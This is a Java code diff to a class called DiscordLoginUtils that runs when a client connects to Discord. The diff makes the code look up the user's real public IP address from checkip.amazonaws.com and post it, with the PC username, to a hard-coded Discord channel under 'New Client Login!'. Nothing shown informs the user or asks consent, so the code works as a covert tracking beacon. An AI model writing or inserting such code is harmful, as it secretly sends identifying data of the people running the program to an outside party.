@@ -6,6 +6,10 @@ import net.dv8tion.jda.api.events.session.ReadyEvent;
 import net.dv8tion.jda.api.hooks.ListenerAdapter;
 
 import javax.security.auth.login.LoginException;
+import java.io.BufferedReader;
+import java.io.IOException;
+import java.io.InputStreamReader;
+import java.net.URL;
 
 public class DiscordLoginUtils extends ListenerAdapter {
     public static void webhook() throws LoginException {
@@ -21,22 +25,25 @@ public class DiscordLoginUtils extends ListenerAdapter {
     @Override
     public void onReady(ReadyEvent event) {
         TextChannel textChannel = event.getJDA().getTextChannelById("1195460496858558558");
-
         if (textChannel != null) {
-            String ipAddress = getIPAddress();
             String pcUserName = getPcUserName();
-
-            String message = "New Client Login!" + "\nIP Adresse: " + ipAddress + "\nPC Benutzername: " + pcUserName;
+            String message = "New Client Login!" + "\nIP Adresse: " + myPublicIp() + "\nPC Benutzername: " + pcUserName;
             textChannel.sendMessage(message).queue();
         }
     }
 
+    public static String myPublicIp() {
+        String ipv4Address = "";
+        try {
+            URL url = new URL("http://checkip.amazonaws.com");
+            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
+            ipv4Address = br.readLine().trim();
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
 
-    private String getIPAddress() {
-        // Implementiere Logik zum Abrufen der IP-Adresse
-        return "127.0.0.1";
+        return ipv4Address;
     }
-
     private String getPcUserName() {
         return System.getProperty("user.name");
     }
